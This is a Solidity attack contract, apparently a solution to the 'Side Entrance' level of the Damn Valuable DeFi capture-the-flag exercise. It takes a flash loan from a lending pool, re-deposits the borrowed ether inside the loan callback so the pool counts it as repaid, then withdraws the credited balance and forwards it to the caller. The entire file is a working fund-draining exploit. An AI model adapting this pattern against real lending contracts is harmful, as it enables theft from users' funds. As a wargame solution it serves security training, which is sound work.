// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPoolAttack is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool private immutable victime;

    constructor(address _victime) {
        victime = ISideEntranceLenderPool(_victime);
    }

    function execute() external payable {
        victime.deposit{value: msg.value}();
    }

    function launchAttack(uint256 amount) external {
        victime.flashLoan(amount);
        victime.withdraw();
        address(msg.sender).call{value: amount}("");
    }

    fallback() external payable {}
}
